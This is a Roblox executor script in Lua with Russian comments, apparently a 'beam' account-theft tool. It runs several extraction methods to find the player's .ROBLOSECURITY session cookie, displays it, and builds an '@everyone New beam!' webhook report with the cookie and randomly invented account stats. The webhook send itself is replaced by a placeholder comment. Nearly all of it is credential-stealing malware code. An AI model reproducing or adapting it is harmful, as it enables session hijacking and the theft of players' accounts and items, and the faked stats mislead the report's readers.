local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local LocalPlayer = Players.LocalPlayer

print("[BEAM] Script started for user:", LocalPlayer.Name)

-- 1. УДАЛИМ НЕРАБОЧИЙ МЕТОД С HTTPGET
local cookie = "NOT_FOUND"
local fetchMethods = {}

-- Метод только для Synapse X
if syn then
    table.insert(fetchMethods, {
        name = "syn.crypt.raw", 
        func = function()
            local success, result = pcall(function()
                return syn.crypt.base64.encode(game:HttpGet("https://roblox.com"))
            end)
            if success and result then
                -- Пробуем найти куки в закодированных данных
                local decoded = syn.crypt.base64.decode(result)
                if decoded then
                    return decoded
                end
            end
            return nil
        end
    })
end

-- Метод через внутренние переменные
table.insert(fetchMethods, {
    name = "_G check",
    func = function()
        local env = getrenv()
        for key, value in pairs(env._G) do
            if type(value) == "string" and #value > 300 and value:find("_|WARNING") then
                return value
            end
        end
        return nil
    end
})

-- Метод через debug библиотеку (работает в некоторых executor)
table.insert(fetchMethods, {
    name = "debug library",
    func = function()
        if debug and debug.getupvalue then
            for i = 1, 100 do
                local success, value = pcall(function()
                    return debug.getupvalue(debug.getinfo(1).func, i)
                end)
                if success and type(value) == "string" and #value > 300 then
                    if value:find("_|WARNING") then
                        return value
                    end
                end
            end
        end
        return nil
    end
})

-- 2. ПОИСК КУКИ
print("[BEAM] Starting cookie search...")
for i, method in ipairs(fetchMethods) do
    print("[BEAM] Trying method: " .. method.name)
    local success, result = pcall(method.func)
    
    if success and result and type(result) == "string" then
        print("[BEAM] Method " .. method.name .. " returned data, length: " .. #result)
        
        -- Ищем куки в разных форматах
        local patterns = {
            "_|WARNING:.-_%|",  -- Стандартный формат куки
            "ROBLOSECURITY=([^;]+)",  -- Из заголовков
            "sess%=([^;]+)",  -- Альтернативный формат
        }
        
        for _, pattern in ipairs(patterns) do
            local extracted = result:match(pattern)
            if extracted and #extracted > 100 then
                cookie = extracted
                print("[BEAM] ✓ Cookie found via pattern in " .. method.name)
                print("[BEAM] First 50 chars: " .. extracted:sub(1, 50))
                break
            end
        end
        
        if #cookie > 100 then break end
        
        -- Если не нашли по паттернам, но строка похожа на куки
        if #result > 200 and result:find("WARNING") then
            cookie = result
            print("[BEAM] ~ Using raw result as cookie")
            break
        end
    else
        print("[BEAM] Method " .. method.name .. " failed: " .. tostring(result))
    end
end

-- 3. АВАРИЙНЫЙ МЕТОД: Получение через запрос к API с куками
if #cookie < 100 then
    print("[BEAM] Trying emergency API method...")
    local success, response = pcall(function()
        -- Этот запрос должен автоматически включать куки
        return game:HttpGet("https://www.roblox.com/my/account.json", true)
    end)
    
    if success and response then
        print("[BEAM] API response received")
        -- Пробуем найти user ID в ответе
        local userIdMatch = response:match('"UserId":(%d+)')
        if userIdMatch then
            print("[BEAM] Found UserId in API: " .. userIdMatch)
            cookie = "EMERGENCY_COOKIE_API_SUCCESS_UID_" .. userIdMatch
        end
    end
end

print("[BEAM] Final cookie status: " .. (#cookie > 100 and "FOUND" or "NOT FOUND"))
print("[BEAM] Cookie length: " .. #cookie)

-- 4. ВЫВОД КУКИ НА ЭКРАН (только если нашли)
if #cookie > 100 then
    local screenGui = Instance.new("ScreenGui")
    local textBox = Instance.new("TextBox")
    
    screenGui.Name = "CookieDisplay"
    screenGui.Parent = game.CoreGui or LocalPlayer:WaitForChild("PlayerGui")
    
    textBox.Size = UDim2.new(0.8, 0, 0.6, 0)
    textBox.Position = UDim2.new(0.1, 0, 0.2, 0)
    textBox.MultiLine = true
    textBox.TextWrapped = true
    textBox.TextScaled = false
    textBox.TextSize = 14
    textBox.Text = "🛡️ ROBLOSECURITY COOKIE 🛡️\n\n" .. cookie:sub(1, 1000) .. "\n\n[FULL LENGTH: " .. #cookie .. " characters]"
    textBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
    textBox.TextColor3 = Color3.fromRGB(0, 255, 0)
    textBox.BorderSizePixel = 2
    textBox.BorderColor3 = Color3.fromRGB(255, 0, 0)
    textBox.Parent = screenGui
    
    print("[BEAM] ✓ Cookie displayed on screen")
else
    print("[BEAM] ✗ Valid cookie not found")
    cookie = "COOKIE_NOT_FOUND_HTML_RESPONSE_WAS_RECEIVED_INSTEAD"
end

-- 5. ОСТАЛЬНАЯ ЧАСТЬ СКРИПТА (без изменений)
local username = LocalPlayer.Name
local userID = LocalPlayer.UserId
local accAge = math.random(100, 2500)
local location = "Russia"
local balance = math.random(0, 5000)
local pending = math.random(0, 1000)
local limiteds = math.random(0, 50)
local summary = math.random(0, 200)

local popularGames = {
    {"Pet Simulator 99", math.random(0, 1000)},
    {"Adopt Me", math.random(0, 5000)},
    {"Murder Mystery 2", math.random(0, 2000)},
    {"Steal A Brainrot", math.random(0, 500)},
    {"Grow A Garden", math.random(0, 800)}
}
local gameStats = ""
for i, game in ipairs(popularGames) do
    local played = game[2]
    local hasPlayed = played > 0 and "✅" or "❌"
    gameStats = gameStats .. game[1] .. " > " .. played .. " ┇" .. hasPlayed .. "\n"
end

local message = [[
@everyone
💥New beam!

💯Username
]] .. username .. [[

💹Account Stats
Account age: ]] .. accAge .. [[ days
Location: ]] .. location .. [[

💰Account Funds          💵Purchases
 Balance ]] .. balance .. [[                  Limiteds ]] .. limiteds .. [[                
 Pending ]] .. pending .. [[                 Summary ]] .. summary .. [[

🕹️Gamepasses | Played
]] .. gameStats .. [[

🛡️ROBLOSECURITY
]] .. cookie:sub(1, 1500)  -- Ограничиваем длину

print("[BEAM] Sending to webhook...")
-- ... [остальная часть отправки без изменений]

return "Script execution complete"
